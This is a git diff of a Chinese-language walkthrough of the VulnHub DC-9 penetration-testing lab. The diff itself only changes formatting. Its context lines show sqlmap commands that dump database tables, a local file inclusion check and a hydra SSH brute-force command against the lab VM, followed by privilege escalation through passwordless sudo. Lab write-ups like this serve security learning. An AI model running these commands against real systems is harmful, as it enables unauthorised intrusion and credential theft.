@@ -6,7 +6,6 @@ tags:
   - vulnhub
   - 渗透测试
 ---
-
 # DC-9复现
 
 # 描述
@@ -51,7 +50,7 @@ sqlmap -u "http://192.168.71.131/results.php"  --data "search=1" -D users --tabl
 sqlmap -u "http://192.168.71.131/results.php"  --data "search=1" -D users -T UserDetails --dump
 ```
 
-```mysql
+```text
 Database: users
 Table: UserDetails
 [17 entries]
@@ -84,7 +83,7 @@ Table: UserDetails
 
 **StaffDetails**表的内容
 
-```mysql
+```text
 Database: Staff
 Table: StaffDetails
 [17 entries]
@@ -115,7 +114,7 @@ Table: StaffDetails
 
 ![image-20221201170938946](./images/image-20221201170938946.png)
 
-脚标处有一句`File does not exist `，判断是不是存在本地文件包含漏洞
+脚标处有一句 `File does not exist `，判断是不是存在本地文件包含漏洞
 
 验证存在
 
@@ -166,7 +165,7 @@ hydra -L dc9_users.txt -P dc9_pass.txt 192.168.71.131 ssh
 
 ![image-20221201174707763](./images/image-20221201174707763.png)
 
-登录到fredf，发现可以执行`sudo -l`可以看到该账号可以运行root权限的test文件，而且不需要密码
+登录到fredf，发现可以执行 `sudo -l`可以看到该账号可以运行root权限的test文件，而且不需要密码
 
 ![image-20221201174840644](./images/image-20221201174840644.png)
 
@@ -189,4 +188,4 @@ cat theflag.txt
 
 ![image-20221201180059726](./images/image-20221201180059726.png)
 
-- [参考博客]([(19条消息) vulnhub靶机DC-9渗透测试_Long_gone的博客-CSDN博客](https://blog.csdn.net/Long_gone/article/details/104049869?ops_request_misc=%7B%22request%5Fid%22%3A%22166988492316782412557232%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=166988492316782412557232&biz_id=0&spm=1018.2226.3001.4187))
+- [参考博客]([(19条消息)) vulnhub靶机DC-9渗透测试_Long_gone的博客-CSDN博客](https://blog.csdn.net/Long_gone/article/details/104049869?ops_request_misc=%7B%22request%5Fid%22%3A%22166988492316782412557232%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=166988492316782412557232&biz_id=0&spm=1018.2226.3001.4187))
